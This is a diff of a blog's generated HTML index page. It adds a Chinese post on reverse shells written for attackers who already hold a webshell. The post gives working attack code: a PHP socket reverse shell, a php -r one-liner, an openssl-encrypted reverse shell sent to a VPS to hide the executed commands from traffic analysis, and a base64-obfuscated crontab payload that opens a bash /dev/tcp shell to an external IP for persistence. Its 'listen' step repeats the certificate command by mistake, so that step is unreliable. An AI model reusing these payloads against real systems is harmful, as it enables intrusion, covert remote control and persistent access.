@@ -254,6 +254,107 @@
 
 
   
+    <article id="post-关于反弹shell的那些事" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/01/关于反弹shell的那些事/">关于反弹shell的那些事</a>
+    </h1>
+  
+
+        
+        <a href="/2018/06/01/关于反弹shell的那些事/" class="archive-article-date">
+  	<time datetime="2018-06-01T04:12:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-01</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="众所周知的反弹shell"><a href="#众所周知的反弹shell" class="headerlink" title="众所周知的反弹shell"></a>众所周知的反弹shell</h4><hr>
+<p>我们拿到webshell后如果想进一步搞事情，那么肯定绕不过反弹shell。即使有蚁剑，菜刀这样的神器，但是非交互式的shell仍有很多不好用的地方。<br>先说反弹shell吧，反弹shell的方法很多，各个语言有各个语言的方式，这里不是为了介绍这些的，当然还是贴一个大佬朋友的博客<a href="https://www.kkzevip.com/?post=21" target="_blank" rel="noopener">&gt;点击这里&lt;</a>，你们可以去上面看看他的总结。<br>另外，补充一个显示生活中非常好用的php反弹shell的脚本，可以说我用这个脚本反弹从来没失败过。<br>代码如下，改好ip+port运行即可：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure>
+
+<p>真的是比网上的那些php反弹shell（比如：php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’）成功率高很多。当然此方法也有限制，限制就是系统没有禁用 proc_popen(默认不禁用)。</p>
+<h4 id="加密的反弹shell"><a href="#加密的反弹shell" class="headerlink" title="加密的反弹shell"></a>加密的反弹shell</h4><hr>
+<p>这个是源于看freebuf的一篇文章，后来才知道原来ssl也可以进行反弹shell的加密。这样我们执行的命令流量就不能被分析出来了（在实战中可能有更大的用处，毕竟留痕更少）。</p>
+<ul>
+<li><p>1 首先，vps上生成SSL证书的公私钥对</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>2 在自己的VPS上监听反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>3 在目标上用openssl加密反弹shell的流量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s;/bin/bash -i &lt; /tmp/s 2&gt;&amp;1|openssl s_client -quiet -connect vps:443 &gt; /tmp/s;rm /tmp/s</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>你可以自己去抓包分析，对比加密反弹和常规反弹包，可以很清楚的知道加密的流量包是分析不出来我们执行了那些命令的。而且由于mkfifo 系统大多数系统自带，所以绝大多数都可以使用这种方式来反弹加密的shell流量。</p>
+<h4 id="利用cron的反弹shell"><a href="#利用cron的反弹shell" class="headerlink" title="利用cron的反弹shell"></a>利用cron的反弹shell</h4><hr>
+<p>有时候我们还没拿到webshell，这时也并一定就没法反弹一个shell出来。这里分享一个例子：<br>曾经有次渗透测试java web网站，网站存在任意文件上传，但是上传的jsp无法执行，可能是需要编译部署后才可执行（黑盒，具体原因现在也没搞清），所以需要其他的思路来拿shell，当时就是利用的任意文件上传cron。</p>
+<p>当然如果有webshell 也可以用cron维持权限：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(<span class="string">'echo ZWNobyAiKiAqICogKiAqIGJhc2ggLWMgJ3tlY2hvLGJhc2ggLWkgPiYgL2Rldi90Y3AvMTE4Ljg5LjIzMy44OS85OTk5IDA+JjF9fHtiYXNlNjQsLWR9fHtiYXNoLC1pfSciIHxjcm9udGFiIC0= |base64 -d|bash -i'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>对crontab不了解的同学可以去深入学习下crontab的结构和知识（很简单的）。</p>
+<h4 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h4><hr>
+<p>上面的都是讲反弹shell，那么反弹shell后怎么拿到一个交互式的shell呢？(ctrl+c断不掉的那种)</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/06/01/关于反弹shell的那些事/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-浅谈PHP的反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -732,6 +833,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">一些工具</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">web</a>
               </li>
              
@@ -741,10 +846,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随笔</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">一些工具</a>
               </li>
             
             <div class="clearfix"></div>
@@ -796,27 +897,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
         <ul class="search-ul">
           
             <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接1</a>
+              <a href="https://kkzevip.com/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>MoR03r</a>
             </li>
           
             <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接2</a>
+              <a href="http://www.dongzt.cn/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>Alkaid-逆向大佬</a>
             </li>
           
             <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接3</a>
-            </li>
-          
-            <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接4</a>
-            </li>
-          
-            <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接5</a>
-            </li>
-          
-            <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接6</a>
+              <a href="https://www.pdsdt.lovepdsdt.com/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>pdsdt</a>
             </li>
           
         </ul>
